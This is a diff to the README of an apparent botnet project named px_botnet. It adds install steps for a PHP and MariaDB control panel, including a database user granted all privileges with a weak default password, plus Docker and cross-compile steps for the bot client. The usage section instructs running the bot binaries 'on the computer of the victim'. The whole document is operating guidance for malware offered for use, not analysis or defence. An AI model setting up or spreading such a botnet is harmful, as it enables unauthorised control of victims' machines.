@@ -44,7 +44,31 @@ Server :
 
 ```bash
 (sudo) apt install apache2 php mariadb-server mariadb-client php php-cli php-fpm php-json php-pdo php-mysql php-zip php-gd  php-mbstring php-curl php-xml php-pear php-bcmath
+(sudo) mkdir /var/www/html
+(sudo) mv WEB/* /var/www/html/
+       cd ../DB
+(sudo) mysql
+MYSQL:
+	CREATE DATABASE IF NOT EXISTS px_base;
+	USE px_base;
+	SOURCE db.sql;
+	CREATE USER 'px_user'@'localhost' IDENTIFIED BY 'px_pass';
+	GRANT ALL PRIVILEGES ON * . * TO 'px_user'@'localhost';
+	FLUSH PRIVILEGES;
 ```
+Now configure config/config.php with the same credentials of the mysql part.
+(Default user: px_user, pass: px_pass and db: px_base)
+
+Server (Under Docker) (Configuration is inside docker-compose.yml) :
+```bash
+cd ./DOCKER
+make
+```
+Open bash under docker :
+```bash
+make bash
+```
+Go to ip:80
 
 Client :
 
@@ -61,11 +85,12 @@ Edit includes/px_botnet.h
 
 make re
 
-If you want to cross compile, edit `Makefile` at line 82 with a "." before "$(cross)" and use : "make everything"
+If you want to cross compile, use : "make everything"
 ```
 
 ## Usage :
-Website : (Upload db, configure config/config.php) Default user/pass: test test
+Website : Default user/pass: test test
+Bot: Execute the binaries on the computer of the victim
 
 ## Demo :
 ![image description](./images/demo.png)
